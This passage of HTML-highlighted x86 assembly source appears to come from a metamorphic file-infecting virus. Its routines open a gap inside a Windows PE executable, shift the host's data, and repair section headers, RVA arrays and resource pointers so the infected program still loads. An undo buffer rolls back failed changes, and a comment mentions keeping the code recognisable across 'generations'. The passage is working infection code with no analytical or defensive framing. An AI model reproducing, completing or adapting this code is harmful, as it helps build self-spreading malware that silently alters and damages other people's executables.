                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@NextSection_01</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NextSection_01_</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NextSection_01</span><span class="sc0">
      </span><span class="sc5">@@NextSection_01_</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc5">@@NextSection_01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; Next section.</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopUpdate_02</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">


     </span><span class="sc1">;; Now we make the hole physically</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RelocHeader</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@End</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">          </span><span class="sc1">; PUSH Physical_Address_Of_Hole</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MappingAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileSize</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MappingAddress</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc5">@@Again</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Shift down all data</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Again</span><span class="sc0">

</span><span class="sc1">;;; Here we fill the hole with 0s</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFFFCh</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc5">@@Again2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Again2</span><span class="sc0">

     </span><span class="sc5">@@End</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Break the 3-POP sequence to avoid a</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">; mis-identification with APICALL_END if the</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; registers are translated as EDX,ECX,EAX in</span><span class="sc0">
                                </span><span class="sc1">; any generation.</span><span class="sc0">
</span><span class="sc5">UpdateHeaders</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function gets the array of RVAs in EAX and updates them as always.</span><span class="sc0">
</span><span class="sc5">UpdateArrayOfRVAs</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; If the array RVA is 0, then exit</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@UpdateArray_OK</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">       </span><span class="sc1">; If the number of elements in the array</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@UpdateArray_OK</span><span class="sc0"> </span><span class="sc1">; is 0, then exit</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; Get the physical address</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TranslateVirtualToPhysical</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; If error, exit</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@UpdateArray_Updated01</span><span class="sc0">
        </span><span class="sc5">@@UpdateArrayLoop_01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">          </span><span class="sc1">; Now check every RVA and fix it</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@UpdateArray_Updated01</span><span class="sc0"> </span><span class="sc1">; if it points after the hole</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc5">@@UpdateArray_Updated01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@UpdateArrayLoop_01</span><span class="sc0">
        </span><span class="sc5">@@UpdateArray_OK</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">UpdateArrayOfRVAs</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;; This function gets the RVA at EBX and looks the section where the RVA</span><span class="sc0">
</span><span class="sc1">;; points whithin. When we find it, then we add the physical address of the</span><span class="sc0">
</span><span class="sc1">;; section and the physical address of the mapping, returning the physical</span><span class="sc0">
</span><span class="sc1">;; address that corresponds to that virtual one.</span><span class="sc0">
</span><span class="sc1">;; </span><span class="sc0">
</span><span class="sc1">;; EBX = Virtual address</span><span class="sc0">
</span><span class="sc5">TranslateVirtualToPhysical</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HeaderAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">    </span><span class="sc1">; Get the number of sections</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">StartOfSectionHeaders</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
     </span><span class="sc5">@@LoopSection</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Virtual address of section</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; If it's below, it isn't here</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@NextSection</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Add the size of the section to the</span><span class="sc0">
                                       </span><span class="sc1">; virtual address of it to get the end</span><span class="sc0">
                                       </span><span class="sc1">; address of the section</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; If &lt;EBX&gt; is above, it isn't here</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@NextSection</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the offset inside the section</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Add that offset to the physical addr.</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; of the section.</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MappingAddress</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Add the mapping address.</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                               </span><span class="sc1">; Return with OK</span><span class="sc0">
     </span><span class="sc5">@@NextSection</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">      </span><span class="sc1">; Check next section</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopSection</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
     </span><span class="sc5">@@Error</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">      </span><span class="sc1">; If the RVA isn't inside any section,</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">           </span><span class="sc1">; return 0.</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">TranslateVirtualToPhysical</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function updates the RVAs of the resource tree.</span><span class="sc0">
</span><span class="sc5">UpdateResourceDir</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
   </span><span class="sc5">@@UpdateResourceDir2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; If 0, update the data (terminal</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">   </span><span class="sc1">;  node)</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@UpdateData</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Get the branch address</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7FFFFFFFh</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get the number of branches that</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">      </span><span class="sc1">; hold from this parent</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">         </span><span class="sc1">; Update the branch recursively</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">@@UpdateResourceDir2</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextDir</span><span class="sc0">          </span><span class="sc1">; Check next branch</span><span class="sc0">
     </span><span class="sc5">@@UpdateData</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; Get the data address</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the RVA to the element in EAX</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">    </span><span class="sc1">; If it's above the hole address, fix it</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@UpdateOK</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the RVA to the element</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">      </span><span class="sc1">; Add it to the undo buffer</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">AddUndoAction</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">    </span><span class="sc1">; Fix the RVA</span><span class="sc0">
    </span><span class="sc5">@@UpdateOK</span><span class="sc4">:</span><span class="sc0">
     </span><span class="sc5">@@NextDir</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">        </span><span class="sc1">; Get the next directory</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">           </span><span class="sc1">; If there aren't more elements, return</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">      </span><span class="sc1">; (recursive call, so go to next branch</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@UpdateResourceDir2</span><span class="sc0">  </span><span class="sc1">; or return completely)</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">UpdateResourceDir</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function adds an "undo" action to the undo buffer. If there is an</span><span class="sc0">
</span><span class="sc1">;; error in the process of updating the headers, when closing the file we</span><span class="sc0">
</span><span class="sc1">;; get this data and restore the old values.</span><span class="sc0">
</span><span class="sc5">AddUndoAction</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MakingFirstHole</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Only make undo actions</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">            </span><span class="sc1">; when making the first hole. If</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Return</span><span class="sc0">              </span><span class="sc1">; we make a second, we can't fail</span><span class="sc0">
                                            </span><span class="sc1">; of doing it, since all checks</span><span class="sc0">
                                            </span><span class="sc1">; where passed on the making of</span><span class="sc0">
                                            </span><span class="sc1">; the first one.</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfUndoActions</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the counter</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OtherBuffers</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the last element address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">              </span><span class="sc1">; + 1 and store the offset of</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; the value to undo and the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; data that address holds.</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OtherBuffers</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Increase the number of undo</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfUndoActions</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">; actions and exit.</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
